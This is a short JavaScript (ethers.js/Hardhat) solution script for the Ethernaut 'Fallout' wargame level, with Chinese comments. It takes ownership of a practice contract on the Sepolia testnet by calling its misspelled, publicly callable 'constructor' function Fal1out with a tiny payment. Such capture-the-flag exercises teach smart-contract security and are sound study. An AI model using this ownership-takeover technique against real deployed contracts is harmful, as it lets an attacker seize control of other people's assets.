//获得以下合约的所有权来完成这一关.
//导包
const {ethers} = require("hardhat");
require("dotenv").config();
const FalloutJson = require("../artifacts/contracts/Fallout.sol/Fallout.json");
const Fallout_ABI = FalloutJson.abi;


const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

//provider
const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
//合约地址
FALLOUT_ADDRESS = '0xe602a0CD667656279C1023ce96abFEEDF4E9AE69';
//创建钱包对象
const wallet = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);
//创建合约实例
const fallout = new  ethers.Contract(FALLOUT_ADDRESS, Fallout_ABI, wallet);

const main = async () => {
    // 输出合约拥有者
    const owner = await fallout.owner();
    console.log('合约拥有者:', owner);
    //合约构造函数写错了，solidity0.6.0 构造函数要与合约名相同，所以等于合约没有owner
    //所以现在要调用Fal1out()函数，观察是payable,所以wallet发送
    console.log('钱包地址为',wallet.address);
    const tx1 = await fallout.Fal1out({value: ethers.utils.parseEther("0.00000001")});
    await tx1.wait();
};




main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });